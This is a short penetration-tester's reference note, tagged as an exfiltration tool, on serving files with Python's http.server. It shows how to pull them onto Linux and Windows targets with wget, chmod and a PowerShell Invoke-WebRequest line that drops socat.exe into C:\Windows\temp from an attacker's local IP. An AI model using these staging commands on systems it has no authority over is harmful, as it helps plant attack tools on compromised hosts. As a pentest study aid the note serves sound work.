---
tags:
  - "#type/tool" 
  - "#attack/exfiltration" 
Link: 
Purpose: transfer files using http
---
more advanced alternative: [[3 Tools/file-transfer/updog|updog]]
# Info
sets up a 3 python webserver, then you can access files from remote machines that you are reachable from
# Usage

execute in directory to make files accessable via HTTP requests
`python3 -m http.server 8000` - 8000 is the port

on Linux target:
`wget` to download files
`chmod +x FILENAME.sh` to make executable

on Windows target: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

